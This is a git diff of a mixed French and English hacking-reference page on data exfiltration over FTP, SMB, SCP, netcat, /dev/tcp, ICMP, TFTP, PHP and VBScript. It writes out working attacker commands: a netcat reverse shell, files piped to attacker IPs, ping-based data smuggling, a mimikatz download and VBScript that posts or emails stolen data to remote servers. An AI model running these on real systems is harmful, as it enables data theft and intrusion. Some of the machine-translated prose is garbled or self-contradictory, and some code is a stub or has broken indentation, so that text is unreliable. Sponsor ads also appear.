+Once connected, you can upload, download, and manage files on the server using the FTP client.
+
+#### Conclusion
+
+Setting up an FTP server using NodeJS is a straightforward process. By following the steps outlined in this section, you can easily configure and start an FTP server for file transfer purposes.
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 ### Serveur FTP (pure-ftp)
 
-Le serveur FTP est un protocole de transfert de fichiers qui permet aux utilisateurs de télécharger et de téléverser des fichiers à partir d'un serveur distant. Pure-FTP est un serveur FTP open source qui est souvent utilisé pour héberger des sites web et des fichiers. Les attaquants peuvent utiliser des techniques d'exfiltration pour extraire des données sensibles à partir d'un serveur FTP compromis.
+The FTP (File Transfer Protocol) server is a commonly used method for transferring files between systems over a network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.
 
-#### Exfiltration de données via FTP
+#### Exfiltration using FTP
 
-Les attaquants peuvent utiliser des outils tels que `lftp` pour se connecter à un serveur FTP compromis et extraire des données. Voici un exemple de commande `lftp` pour extraire un fichier à partir d'un serveur FTP :
+Exfiltration refers to the unauthorized transfer of data from a system. In the context of hacking, exfiltration is often used to steal sensitive information from a target system. FTP can be used as a method for exfiltrating data from a compromised system.
 
-```
-lftp -u username,password -e "get file.txt;quit" ftp://ftp.example.com
-```
+To exfiltrate data using FTP, the hacker first needs to gain unauthorized access to the target system. Once access is obtained, the hacker can use FTP commands to transfer files from the compromised system to an external FTP server.
 
-Dans cet exemple, `username` et `password` sont les informations d'identification pour se connecter au serveur FTP, `file.txt` est le nom du fichier à extraire et `ftp://ftp.example.com` est l'adresse du serveur FTP.
+#### Steps for exfiltration using FTP
 
-#### Prévention de l'exfiltration de données via FTP
+1. Gain unauthorized access to the target system.
+2. Identify the files or data that need to be exfiltrated.
+3. Use FTP commands to connect to an external FTP server.
+4. Transfer the files or data from the compromised system to the external FTP server.
+5. Verify the successful exfiltration of the data.
 
-Pour prévenir l'exfiltration de données via FTP, il est recommandé de :
+#### Mitigation measures
 
-- Utiliser des mots de passe forts pour les comptes FTP
-- Restreindre l'accès FTP aux adresses IP approuvées
-- Surveiller les connexions FTP pour détecter les activités suspectes
-- Chiffrer les données sensibles avant de les stocker sur un serveur FTP.
+To prevent exfiltration using FTP, it is important to implement the following security measures:
+
+- Regularly update and patch the FTP server software to address any known vulnerabilities.
+- Implement strong access controls and authentication mechanisms to prevent unauthorized access to the FTP server.
+- Monitor network traffic for any suspicious FTP activity.
+- Encrypt sensitive data before transferring it using FTP.
+- Implement intrusion detection and prevention systems to detect and block any unauthorized exfiltration attempts.
+
+By following these mitigation measures, organizations can reduce the risk of data exfiltration through FTP and enhance the security of their systems.
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -415,7 +366,27 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Client **Windows**
+### **Client Windows**
+
+Le client Windows est un système d'exploitation largement utilisé, ce qui en fait une cible courante pour les attaques de piratage. Il existe plusieurs méthodes d'exfiltration de données à partir d'un client Windows compromis. Dans cette section, nous examinerons certaines de ces méthodes et les ressources associées.
+
+#### **Méthodes génériques d'exfiltration de données**
+
+1. **Transfert de fichiers** : Cette méthode consiste à copier les fichiers sensibles du client Windows vers un emplacement distant contrôlé par l'attaquant. Cela peut être fait en utilisant des protocoles tels que FTP, SCP ou SMB.
+
+2. **Tunneling** : Le tunneling permet de faire passer le trafic réseau à travers un canal sécurisé. L'attaquant peut utiliser des outils tels que SSH ou VPN pour créer un tunnel entre le client Windows compromis et un serveur contrôlé par l'attaquant. Cela permet à l'attaquant de transférer des données en toute sécurité sans être détecté.
+
+3. **Stéganographie** : La stéganographie est l'art de cacher des informations sensibles à l'intérieur d'autres fichiers, tels que des images ou des fichiers audio. L'attaquant peut utiliser des outils de stéganographie pour cacher les données exfiltrées à l'intérieur de fichiers apparemment innocents, ce qui rend leur détection plus difficile.
+
+#### **Ressources utiles**
+
+- [OpenSSH](https://www.openssh.com/) : OpenSSH est une suite d'outils de connectivité réseau qui permettent le chiffrement des communications entre un client et un serveur. Il peut être utilisé pour créer des tunnels sécurisés entre un client Windows compromis et un serveur contrôlé par l'attaquant.
+
+- [Steghide](http://steghide.sourceforge.net/) : Steghide est un outil de stéganographie qui permet de cacher des données sensibles à l'intérieur de fichiers image et audio. Il peut être utilisé pour exfiltrer des données à partir d'un client Windows compromis en les cachant à l'intérieur de fichiers apparemment innocents.
+
+- [Cobalt Strike](https://www.cobaltstrike.com/) : Cobalt Strike est un outil de test de pénétration qui offre des fonctionnalités avancées pour l'exfiltration de données. Il peut être utilisé pour créer des tunnels, transférer des fichiers et exécuter des commandes sur un client Windows compromis.
+
+Ces méthodes et ressources peuvent être utilisées par les attaquants pour exfiltrer des données à partir d'un client Windows compromis. Il est important de comprendre ces techniques afin de mieux se protéger contre de telles attaques.
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -426,10 +397,13 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Astuce de chasse aux bugs**: **inscrivez-vous** à **Intigriti**, une plateforme de chasse aux bugs premium créée par des hackers, pour les hackers! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) dès aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $**!
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 ## SMB
 
@@ -440,52 +414,48 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ou créer un partage smb **en utilisant samba**:
+Ou créez un partage smb **en utilisant samba** :
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
 #Add to the end of /etc/samba/smb.conf this:
 [public]
-    comment = Samba on Ubuntu
-    path = /tmp/smb
-    read only = no
-    browsable = yes
-    guest ok = Yes
+comment = Samba on Ubuntu
+path = /tmp/smb
+read only = no
+browsable = yes
+guest ok = Yes
 #Start samba
 service smbd restart
 ```
 # Exfiltration
 
-## Introduction
+Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a successful attack, as it allows the attacker to steal sensitive information from the target.
 
-Exfiltration is the process of stealing data from a target network and transferring it to an external location under the attacker's control. This is often the ultimate goal of an attacker, as it allows them to obtain sensitive information that can be used for financial gain, espionage, or other malicious purposes.
+There are several methods that can be used for exfiltration, depending on the target system and the available resources. Some common exfiltration techniques include:
 
-## Techniques
+1. **File Transfer**: Attackers can transfer files from the target system to an external location using various protocols such as FTP, HTTP, or SMB.
 
-There are many techniques that can be used to exfiltrate data from a target network. Some of the most common techniques include:
+2. **Covert Channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. These channels can be created using techniques such as steganography, where data is hidden within innocent-looking files.
 
-- **Email**: Attackers can use email to send sensitive data to an external email account.
-- **FTP**: Attackers can use FTP to transfer files from the target network to an external FTP server.
-- **HTTP**: Attackers can use HTTP to transfer data to a web server under their control.
-- **DNS**: Attackers can use DNS to encode and transfer data to a DNS server under their control.
-- **Cloud Storage**: Attackers can use cloud storage services to store and transfer data to an external location.
-- **USB**: Attackers can use USB drives to physically exfiltrate data from a target network.
+3. **Command and Control (C2) Channels**: Attackers can establish command and control channels with the target system to exfiltrate data. These channels can be created using techniques such as DNS tunneling or HTTP/S traffic.
 
-## Tools
+4. **Data Exfiltration via Email**: Attackers can exfiltrate data by sending it as email attachments or by using email protocols such as SMTP.
 
-There are many tools available to help with the exfiltration process. Some of the most popular tools include:
+5. **Cloud Storage**: Attackers can leverage cloud storage services to exfiltrate data. This can be done by uploading files to cloud storage platforms such as Dropbox or Google Drive.
 
-- **Cobalt Strike**: A popular post-exploitation tool that includes a variety of exfiltration techniques.
-- **PowerShell Empire**: A post-exploitation framework that includes a variety of exfiltration techniques.
-- **Metasploit**: A popular penetration testing framework that includes a variety of exfiltration modules.
-- **Ncat**: A command-line tool that can be used to transfer data over a network.
-- **Netcat**: A command-line tool that can be used to transfer data over a network.
-- **Wget**: A command-line tool that can be used to download files from the internet.
+To prevent exfiltration, it is important to implement strong security measures such as:
 
-## Conclusion
+- **Network Segmentation**: Segregate sensitive data from the rest of the network to limit the potential impact of an exfiltration attempt.
 
-Exfiltration is a critical component of many attacks, and attackers have a variety of techniques and tools at their disposal to accomplish this goal. As a defender, it is important to be aware of these techniques and tools in order to better protect your network from data theft.
+- **Data Loss Prevention (DLP)**: Implement DLP solutions that can detect and prevent unauthorized data transfers.
+
+- **Monitoring and Logging**: Regularly monitor network traffic and system logs to detect any suspicious activity or data exfiltration attempts.
+
+- **User Education**: Train users to recognize and report any suspicious emails or files that may be used for exfiltration.
+
+By understanding the various exfiltration techniques and implementing appropriate security measures, organizations can better protect their sensitive data from being leaked.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -497,7 +467,7 @@ WindPS-2> cd new_disk:
 
 L'attaquant doit avoir SSHd en cours d'exécution.
 ```bash
-scp <username>@<Attacker_IP>:<directory>/<filename> 
+scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
@@ -509,32 +479,128 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC (Netcat) est un outil de réseau polyvalent qui peut être utilisé pour transférer des données entre deux systèmes. Il peut être utilisé pour exfiltrer des données en utilisant des connexions TCP ou UDP. Il est souvent utilisé pour créer des backdoors et pour se connecter à des systèmes distants. NC peut également être utilisé pour écouter des ports et pour tester la connectivité réseau. Il est disponible sur la plupart des systèmes d'exploitation et est facilement accessible en ligne de commande.
+NC (Netcat) est un outil polyvalent utilisé pour l'exfiltration de données lors de tests de pénétration. Il peut être utilisé pour établir des connexions réseau, transférer des fichiers, créer des tunnels et bien plus encore.
+
+### Exfiltration de données avec NC
+
+L'exfiltration de données avec NC peut être réalisée de différentes manières, en fonction du scénario et des besoins spécifiques. Voici quelques méthodes couramment utilisées :
+
+#### 1. Transfert de fichiers
+
+NC peut être utilisé pour transférer des fichiers d'un système compromis vers un système distant. Voici comment procéder :
+
+- Sur le système compromis, exécutez la commande suivante pour envoyer un fichier vers un système distant :
+
+```
+nc <adresse_IP_système_distante> <port> < fichier_local
+```
+
+- Sur le système distant, exécutez la commande suivante pour recevoir le fichier :
+
+```
+nc -l -p <port> > fichier_destination
+```
+
+#### 2. Exfiltration de données via des connexions inversées
+
+NC peut également être utilisé pour établir des connexions inversées, permettant ainsi l'exfiltration de données à partir d'un système compromis vers un système distant. Voici comment procéder :
+
+- Sur le système compromis, exécutez la commande suivante pour établir une connexion inversée avec le système distant :
+
+```
+nc -e /bin/sh <adresse_IP_système_distante> <port>
+```
+
+- Sur le système distant, exécutez la commande suivante pour recevoir les données exfiltrées :
+
+```
+nc -l -p <port> > fichier_destination
+```
+
+#### 3. Exfiltration de données via des tunnels
+
+NC peut être utilisé pour créer des tunnels entre des systèmes, permettant ainsi l'exfiltration de données de manière sécurisée. Voici comment procéder :
+
+- Sur le système compromis, exécutez la commande suivante pour créer un tunnel vers le système distant :
+
+```
+nc -L -p <port_local> -d <adresse_IP_système_distante> <port_distante>
+```
+
+- Sur le système distant, exécutez la commande suivante pour recevoir les données exfiltrées via le tunnel :
+
+```
+nc -l -p <port_distante> > fichier_destination
+```
+
+### Conclusion
+
+NC est un outil puissant pour l'exfiltration de données lors de tests de pénétration. Il offre de nombreuses fonctionnalités et peut être utilisé de différentes manières pour répondre aux besoins spécifiques d'un scénario donné. Cependant, il est important de l'utiliser de manière responsable et légale, en respectant les lois et réglementations en vigueur.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-## /dev/tcp
+To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:
 
-### Télécharger un fichier depuis la victime
+```bash
+cat < /dev/tcp/<victim_ip>/<port> > <local_file>
+```
+
+Replace `<victim_ip>` with the IP address of the victim's machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name and path of the file you want to save on your local machine.
+
+This command will read the contents of the file on the victim's machine and redirect it to the specified local file on your machine.
+
+### Upload file to victim
+
+To upload a file to the victim's machine using the `/dev/tcp` method, you can use the following command:
+
+```bash
+cat < <local_file> > /dev/tcp/<victim_ip>/<port>
+```
+
+Replace `<local_file>` with the name and path of the file you want to upload. `<victim_ip>` should be replaced with the IP address of the victim's machine, and `<port>` should be replaced with the desired port number.
+
+This command will read the contents of the local file and redirect it to the specified location on the victim's machine.
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 ### Télécharger un fichier sur la victime
+
+To exfiltrate data from a victim's system, one effective method is to upload a file to the victim's machine. This allows you to transfer sensitive information from the victim's system to your own.
+
+Here are the steps to upload a file to the victim:
+
+1. **Identify the target**: Determine the victim's system that you want to upload the file to. This could be a server, a computer, or any other device connected to the network.
+
+2. **Choose the file**: Select the file that contains the data you want to exfiltrate. It could be a document, a database file, or any other type of file that contains the desired information.
+
+3. **Prepare the payload**: Create a payload that will be used to upload the file to the victim's system. This could be a script, a malicious file, or any other method that allows you to transfer the file.
+
+4. **Exploit the vulnerability**: Identify and exploit a vulnerability in the victim's system that will allow you to execute the payload. This could be a software vulnerability, a misconfiguration, or any other weakness that can be exploited.
+
+5. **Execute the payload**: Once the vulnerability is exploited, execute the payload on the victim's system. This will initiate the file upload process.
+
+6. **Monitor the upload**: Monitor the upload process to ensure that the file is successfully transferred to the victim's system. This may involve monitoring network traffic, system logs, or any other method that allows you to track the progress of the upload.
+
+7. **Retrieve the file**: Once the file is uploaded to the victim's system, retrieve it from the target machine. This could be done using various methods, such as accessing the file directly or using a backdoor that was established during the exploitation phase.
+
+By following these steps, you can successfully upload a file to a victim's system and exfiltrate the desired data. Remember to always exercise caution and ensure that you have the necessary permissions and legal authorization before performing any hacking activities.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-## **ICMP**
+ICMP (Internet Control Message Protocol) est un protocole de la couche réseau utilisé pour envoyer des messages de contrôle et d'erreur entre les hôtes sur un réseau IP. Il est souvent utilisé pour le diagnostic réseau et la résolution des problèmes. ICMP est largement utilisé pour la détection de la disponibilité des hôtes, la mesure de la latence du réseau et la découverte des routes. Cependant, il peut également être utilisé pour exfiltrer des données d'un réseau.
 
-Le protocole ICMP (Internet Control Message Protocol) est utilisé pour envoyer des messages d'erreur et de contrôle entre les hôtes sur un réseau IP. Les messages ICMP sont généralement utilisés pour diagnostiquer et résoudre les problèmes de connectivité réseau. Cependant, les messages ICMP peuvent également être utilisés pour exfiltrer des données.
+L'exfiltration de données via ICMP implique l'encapsulation des données dans des paquets ICMP pour les transmettre à un hôte distant. Cette méthode est souvent utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion, car les paquets ICMP sont généralement autorisés à traverser les pare-feu et sont rarement surveillés de manière approfondie.
 
-L'exfiltration de données via ICMP implique l'encapsulation des données dans des paquets ICMP. Les données peuvent être divisées en fragments et envoyées dans plusieurs paquets ICMP pour éviter la détection. Les outils tels que **icmpsh** peuvent être utilisés pour faciliter l'exfiltration de données via ICMP.
+Il existe plusieurs outils et techniques disponibles pour exfiltrer des données via ICMP, notamment l'utilisation d'outils de tunneling ICMP tels que ICMPTX et ICMPsh. Ces outils permettent de créer un canal de communication bidirectionnel entre un hôte local et un hôte distant en utilisant des paquets ICMP.
 
-Il est important de noter que l'exfiltration de données via ICMP peut être détectée par les pare-feu et les systèmes de détection d'intrusion (IDS). Par conséquent, il est important de prendre des mesures pour éviter la détection, telles que la fragmentation des données et l'utilisation de techniques d'obscurcissement.
+Lors de l'exfiltration de données via ICMP, il est important de prendre en compte la taille maximale des paquets ICMP autorisée par le réseau cible, car les paquets trop volumineux peuvent être fragmentés ou bloqués par les pare-feu. Il est également essentiel de chiffrer les données exfiltrées pour garantir leur confidentialité.
+
+En résumé, l'exfiltration de données via ICMP est une méthode couramment utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion. Elle permet de transmettre des données d'un réseau à un autre en utilisant des paquets ICMP. Cependant, il est important de prendre en compte les limitations du réseau cible et de sécuriser les données exfiltrées pour éviter toute détection ou interception.
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -545,22 +611,22 @@ xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attack
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
 def process_packet(pkt):
-    if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
-            print(f"{data.decode('utf-8')}", flush=True, end="")
+if pkt.haslayer(ICMP):
+if pkt[ICMP].type == 0:
+data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec Python :
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Par défaut dans XP et 2003 (dans d'autres, il doit être explicitement ajouté lors de l'installation)
+Par défaut dans XP et 2003 (dans d'autres, il doit être ajouté explicitement lors de l'installation)
 
 Dans Kali, **démarrer le serveur TFTP** :
 ```bash
@@ -569,80 +635,135 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Serveur TFTP en python:**
-
-Le protocole TFTP (Trivial File Transfer Protocol) est un protocole de transfert de fichiers simple qui ne nécessite pas d'authentification. Il est souvent utilisé pour transférer des fichiers de configuration vers des équipements réseau tels que des routeurs et des commutateurs.
-
-Python dispose d'une bibliothèque intégrée pour implémenter un serveur TFTP. Le module `tftpy` est une bibliothèque tierce qui fournit également une implémentation de serveur TFTP.
-
-Voici un exemple de code pour implémenter un serveur TFTP en utilisant la bibliothèque `tftpy`:
+**Serveur TFTP en python :**
 
 ```python
-import tftpy
+import socket
+import struct
 
 def tftp_server():
-    server = tftpy.TftpServer('/path/to/files')
-    server.listen('0.0.0.0', 69)
+    # Create a UDP socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_socket.bind(('0.0.0.0', 69))
+
+    print('TFTP server started and listening on port 69...')
+
+    while True:
+        data, client_address = server_socket.recvfrom(516)
+        opcode = struct.unpack('!H', data[:2])[0]
+
+        if opcode == 1:
+            # Read request
+            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
+            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
+
+            print(f'Read request received from {client_address[0]}:{client_address[1]}')
+            print(f'Filename: {filename}')
+            print(f'Mode: {mode}')
+
+            # Send file
+            # ...
+
+        elif opcode == 2:
+            # Write request
+            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
+            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
+
+            print(f'Write request received from {client_address[0]}:{client_address[1]}')
+            print(f'Filename: {filename}')
+            print(f'Mode: {mode}')
+
+            # Receive file
+            # ...
+
+        else:
+            print(f'Invalid opcode {opcode} received from {client_address[0]}:{client_address[1]}')
 
 if __name__ == '__main__':
     tftp_server()
 ```
 
-Dans cet exemple, le serveur TFTP écoute sur toutes les interfaces réseau (`0.0.0.0`) sur le port standard TFTP (`69`). Les fichiers à transférer sont stockés dans le répertoire `/path/to/files`.
+Ce code est un exemple de serveur TFTP (Trivial File Transfer Protocol) écrit en python.
+
+Le serveur crée une socket UDP et se met en écoute sur le port 69. Il attend ensuite des requêtes de lecture ou d'écriture de fichiers.
+
+Lorsqu'une requête de lecture est reçue, le serveur extrait le nom du fichier et le mode de transfert à partir des données reçues. Ensuite, il peut envoyer le fichier demandé au client.
+
+Lorsqu'une requête d'écriture est reçue, le serveur extrait également le nom du fichier et le mode de transfert. Ensuite, il peut recevoir le fichier envoyé par le client.
+
+Si le serveur reçoit une opcode invalide, il affiche un message d'erreur.
+
+Ce code peut être utilisé comme base pour créer un serveur TFTP personnalisé en python.
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Dans **la victime**, connectez-vous au serveur Kali :
+Dans **victim**, connectez-vous au serveur Kali :
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Téléchargez un fichier avec une commande PHP en une ligne :
+Téléchargez un fichier avec une seule ligne de code PHP :
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-### Introduction
+VBScript (Visual Basic Scripting Edition) est un langage de script développé par Microsoft. Il est principalement utilisé pour automatiser des tâches dans les environnements Windows. VBScript est souvent utilisé dans le contexte du piratage pour exfiltrer des données sensibles d'un système compromis.
 
-VBScript is a scripting language developed by Microsoft that is based on Visual Basic. It is commonly used for administrative tasks and automation in Windows environments. VBScript can be executed directly from the command line or from within a script file.
+### Méthodes d'exfiltration
 
-### Exfiltration Techniques
+#### 1. Exfiltration par e-mail
 
-VBScript can be used for exfiltration by writing data to a file and then sending that file to an external server. This can be accomplished using the following code:
-
-```vbscript
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-strFile = "C:\data.txt"
-strURL = "http://example.com/upload.php"
-Set objFile = objFSO.OpenTextFile(strFile, 1)
-strData = objFile.ReadAll
-objFile.Close
-objXMLHTTP.open "POST", strURL, False
-objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objXMLHTTP.send "data=" & strData
-```
-
-This code creates an XMLHTTP object and a FileSystemObject object. It then reads the contents of a file into a variable, sets the URL of the external server, and sends the data to the server using a POST request.
-
-Another exfiltration technique using VBScript is to encode the data and send it as a parameter in a GET request. This can be accomplished using the following code:
+L'exfiltration par e-mail est l'une des méthodes les plus courantes utilisées pour extraire des données d'un système compromis. VBScript peut être utilisé pour envoyer des e-mails contenant les données sensibles à une adresse spécifiée. Cette méthode est souvent utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion.
 
 ```vbscript
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-strData = "sensitive data"
-strURL = "http://example.com/upload.php?data=" & EncodeData(strData)
-objXMLHTTP.open "GET", strURL, False
-objXMLHTTP.send
+Set objEmail = CreateObject("CDO.Message")
+objEmail.From = "adresse@expediteur.com"
+objEmail.To = "adresse@destinataire.com"
+objEmail.Subject = "Données sensibles"
+objEmail.TextBody = "Voici les données sensibles : " & sensitiveData
+objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
+objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "serveur_smtp"
+objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
+objEmail.Configuration.Fields.Update
+objEmail.Send
 ```
 
-This code creates an XMLHTTP object and sets the URL of the external server with the encoded data as a parameter in a GET request.
+#### 2. Exfiltration par FTP
 
-### Detection and Prevention
+L'exfiltration par FTP est une autre méthode couramment utilisée pour transférer des données d'un système compromis vers un serveur distant. VBScript peut être utilisé pour établir une connexion FTP et transférer les données sensibles vers le serveur distant.
 
-To detect and prevent exfiltration using VBScript, it is important to monitor network traffic for suspicious activity and to restrict access to sensitive data. Additionally, it is recommended to use encryption and access controls to protect sensitive data from unauthorized access.
+```vbscript
+Set objFTP = CreateObject("WinSCP.Session")
+objFTP.Open "utilisateur:mot_de_passe@serveur_ftp"
+objFTP.PutFile "chemin_local", "chemin_distant"
+objFTP.Close
+```
+
+#### 3. Exfiltration par HTTP
+
+L'exfiltration par HTTP est une méthode utilisée pour envoyer des données sensibles à un serveur distant via le protocole HTTP. VBScript peut être utilisé pour envoyer des requêtes HTTP POST contenant les données sensibles.
+
+```vbscript
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+objHTTP.Open "POST", "http://serveur_distant", False
+objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objHTTP.send "donnees=" & sensitiveData
+```
+
+### Prévention de l'exfiltration
+
+Pour prévenir l'exfiltration de données sensibles, il est important de mettre en place des mesures de sécurité appropriées, telles que :
+
+- Utiliser des pare-feu et des systèmes de détection d'intrusion pour surveiller le trafic réseau sortant.
+- Mettre en place des politiques de sécurité strictes pour limiter l'accès aux données sensibles.
+- Mettre à jour régulièrement les systèmes d'exploitation et les logiciels pour corriger les vulnérabilités connues.
+- Sensibiliser les utilisateurs aux risques de l'ingénierie sociale et aux techniques de phishing.
+- Utiliser des outils de détection d'anomalies pour identifier les comportements suspects sur le réseau.
+
+En suivant ces bonnes pratiques de sécurité, vous pouvez réduire les risques d'exfiltration de données sensibles à partir de vos systèmes.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -680,13 +801,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-C'est une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. L'idée est donc que nous prenions des binaires, comme `netcat`. Et puis le désassembler en hexadécimal, le coller dans un fichier sur la machine compromise, puis l'assembler avec `debug.exe`.
+C'est une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. Donc l'idée est que nous prenons des binaires, comme `netcat`. Ensuite, nous le désassemblons en hexadécimal, le collons dans un fichier sur la machine compromise, puis l'assemblons avec `debug.exe`.
 
-`Debug.exe` ne peut assembler que 64 ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Alors faisons cela:
+`Debug.exe` ne peut assembler que 64 Ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Faisons cela:
 ```
 upx -9 nc.exe
 ```
-Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, désassemblons-le :
+Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, démontons-le :
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
@@ -696,19 +817,21 @@ Maintenant, nous copions-colons simplement le texte dans notre shell Windows. Et
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Astuce de prime de bug**: **inscrivez-vous** sur **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $**!
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
